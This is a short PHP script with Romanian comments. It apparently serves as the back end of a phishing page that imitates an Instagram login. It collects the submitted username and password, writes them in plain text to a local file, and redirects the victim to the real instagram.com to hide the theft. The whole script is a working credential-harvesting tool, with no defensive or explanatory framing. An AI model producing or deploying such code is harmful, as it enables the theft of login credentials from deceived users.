<?php
// Verifică dacă scriptul este accesat prin metoda POST
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] == 'POST') {
    // Preia datele trimise prin formular
    $nume = $_POST['nume'] ?? 'Nedefinit'; // Operatorul ?? este folosit pentru a returna 'Nedefinit' dacă indexul 'nume' nu există
    $parola = $_POST['parola'] ?? 'Nedefinit'; 

    // Deschide sau creează fișierul 'date.txt' pentru a adăuga textul primit
    $file = fopen("date.txt", "a"); // 'a' este modul pentru append, adaugă la sfârșitul fișierului

    // Verifică dacă fișierul a fost deschis cu succes
    if ($file === false) {
        echo "Eroare la deschiderea fișierului!";
    } else {
        // Scrie textul în fișier și închide fișierul
        fwrite($file, "Nume: $nume, Parola: $parola\n"); // Folosește variabilele $nume și $parola aici
        fclose($file);

        header('Location: https://www.instagram.com/');
        exit; 
    }
} else {
    // Dacă scriptul nu este accesat prin metoda POST, afișează un mesaj de eroare
    echo "Această pagină trebuie accesată prin metoda POST.";
}
?>
